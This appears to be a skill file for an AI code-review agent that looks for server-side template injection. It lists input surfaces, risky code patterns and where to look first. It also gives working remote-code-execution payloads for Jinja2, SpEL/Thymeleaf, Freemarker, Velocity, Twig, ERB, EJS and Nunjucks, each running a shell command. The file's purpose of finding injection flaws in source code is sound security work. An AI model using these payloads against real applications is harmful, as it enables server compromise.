---
name: recon-ssti
description: Server-side template injection across Jinja / Mako / Velocity / Freemarker / Thymeleaf / Twig / Handlebars / EJS / ERB with engine fingerprinting, sandbox escape, and RCE gadget chains
---

# ssti — for reconnaissance over source

You are READING SOURCE, not sending requests. Nothing below is a
step to perform against a running application; it is a description of where this class
of bug lives and what it looks like in code.

Use it to decide **where to read** and **what to compare**. The highest-value finding
in this class is usually an ABSENCE — a check that every sibling handler performs and
this one does not. You cannot grep for a line that was never written, so find it by
reading neighbours and noticing the disagreement.

Record what you find with `record_surface` as a candidate, citing file and line. A
candidate is a suspicion with evidence, never a proven vulnerability.

## Where this lives

**Input shapes that reach the renderer**
- Form fields, query / path / header values, cookies, JSON / GraphQL variables
- Filenames and file metadata processed by document / report templates
- Email subject / body / template-selector fields
- Theme / customization endpoints (CSS / HTML generation, dashboard widgets, webhook payload templates)
- Markdown / WYSIWYG content rendered through a templating layer downstream

**Code patterns that enable injection**
- User input concatenated into a template string before `render(template_str)` instead of passed as a context variable to `render(template_obj, context)`
- "Template editor" features for tenants / admins where the *template itself* is user-controllable
- `format()` / `sprintf()` / printf-style chains with user-controlled format string downstream of a template
- YAML / TOML / JSON values whose strings are later evaluated through a template

**Engines in scope**
- Python: Jinja2, Mako, Django (limited)
- Java: Velocity, Freemarker, Thymeleaf (with SpEL), JSP EL
- JS / Node: Handlebars, Nunjucks, EJS, Pug, Marko, Dust
- Ruby: ERB, Haml, Slim
- PHP: Twig, Smarty, Blade
- .NET: Razor, RazorEngine

## Shapes this takes in code

### Jinja2 / Mako (Python)

The classic Python class walk — every object exposes its method-resolution-order, which leads to `object`, which exposes every subclass loaded in the interpreter, which includes things like `subprocess.Popen`:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```

Locate a useful subclass and call it. Common gadgets when builtins are reachable through globals:

```jinja
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Sandbox bypass: even with `SandboxedEnvironment`, attribute-lookup tricks (`|attr('__class__')`) and `request.environ` access can re-introduce reachability. Check whether the app exposes `request`, `config`, `cycler`, or any framework global into the template context.

### Velocity / Freemarker / Thymeleaf (Java)

SpEL (Spring Expression Language) — used by Thymeleaf and various Spring components — reaches `Runtime` via the `T()` type operator. Note that `Runtime.exec()` returns a `java.lang.Process` object whose `toString()` is `"Process[pid=...]"`, **not** the command's stdout. To get reflected output you need to consume the process's `InputStream`:

```spel
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

The first form confirms execution (rendered Process object proves the call ran); the Scanner form is universally available; the `IOUtils` form is shorter when Apache Commons IO is on the classpath. For blind contexts, validate via OAST or sleep.

Freemarker's `freemarker.template.utility.Execute` is the canonical RCE gadget when not denylisted, and unlike `Runtime.exec` it returns the command output as a string directly:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

Velocity gadgets typically don't have `$Runtime` in context — that's not a standard Velocity built-in. The portable approach is string-class reflection from any reachable object:

```velocity
#set($s = "")
#set($r = $s.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))
$r.exec("id")
```

This requires the default `UberspectImpl` (Velocity 1.x and Velocity 2.x without `SecureUberspector`); same `Process.toString()` caveat applies — capture stdout via `Scanner` or `BufferedReader` if reflected output is needed. If the application uses Velocity Tools, `$class` (a `ClassTool`) is often in scope and shortens the chain considerably.

Thymeleaf SSTI requires control over the *template source*, not just over a model variable bound into the template — normal Spring MVC binding renders `${userInput}` as a value, never re-evaluated as SpEL. The exploitable surface is `templateEngine.process(userControlledString, ctx)`, admin-editable email / notification templates, and template fragments composed from user input. When that surface exists, the same SpEL payloads apply:

```html
<div th:utext="${T(java.lang.Runtime).getRuntime().exec('id')}"></div>
<div th:utext="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}"></div>
```

Confusing this with normal model binding produces false positives — confirm the template source itself is attacker-influenced before flagging.

### Smarty / Twig / Blade (PHP)

Twig sandbox bypasses are version-specific. The canonical historical gadget (Twig 1.x) registered `system` as an undefined-filter callback, then invoked it through the filter pipeline:

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

This was patched — in Twig 2.x / 3.x `_self` returns the template name as a string and no longer exposes `.env`. Modern bypasses depend on which extensions are loaded and the active sandbox policy; consult Twig's published security advisories for the current state and probe with the version-specific gadgets (filter/function abuse, reflection on `_context` in some configs).

Smarty `{php}...{/php}` was the historical RCE primitive; deprecated in Smarty 3 and removed in 4. On modern Smarty, the surface is static-method invocation and template-object reflection — `{$smarty.template_object->smarty->...}` walks back to the Smarty engine, and direct static calls on whitelisted classes (e.g. `{Smarty_Internal_Write_File::writeFile(...)}` on misconfigured installs) reach the filesystem. Probe both before assuming Smarty is hardened.

Blade (Laravel) compiles templates to PHP on first render and caches the compiled output, so the dangerous paths are runtime: `Blade::render($userControlledString, ...)`, `Blade::compileString(...)` with user input, or any reachable `@php ... @endphp` block whose body is composed from user input — all three are direct RCE.

### ERB / Haml (Ruby)

Direct Ruby evaluation — backticks are the shortest path that *reflects* command output:

```erb
<%= `id` %>
<%= IO.popen('id').read %>
<% require 'open3'; out, _ = Open3.capture2('id'); %><%= out %>
<%= system('id') %>
```

The first three render the command's stdout into the response. `system('id')` returns `true`/`false` and prints the command output to the *server's* stdout, not the HTTP body — useful for confirming execution succeeded but not for capturing output. Pair with OAST or a side-effect (file write, DNS lookup) when the response doesn't reflect anything.

Haml is the same risk surface in different syntax. `instance_eval` / `class_eval` chained off any reachable object becomes RCE.

### Handlebars / Nunjucks / EJS (JavaScript)

EJS evaluates inline JavaScript:

```ejs
<%= require('child_process').execSync('id').toString() %>
```

Nunjucks via constructor walk on reachable objects:

```nunjucks
{{range.constructor("return require('child_process').execSync('id')")()}}
```

Handlebars itself is harder (default helpers are restricted), but custom helpers that pass arguments to `eval`, `Function`, or `child_process` re-open the surface. Also probe for prototype pollution as an SSTI amplifier — once `Object.prototype` is polluted, downstream template logic may execute attacker-controlled code paths.

## Where to look first

- Email rendering pipelines (subject / body / "from" templates)
- PDF / report generators (server-side render → headless browser)
- CMS theme and plugin editors
- Webhook and notification payload templates
- API response formatters that interpolate strings (pagination labels, error messages, custom field renders)
- Admin / tenant template editors — explicit "edit your template" features

---

Adapted from the strix project's `skills/vulnerabilities/ssti.md` (Apache-2.0). Changes: sections
covering live-target testing, validation and bypass techniques were removed, because
docket's recon agent reads source and executes nothing; the remaining text is
unmodified. See NOTICE.
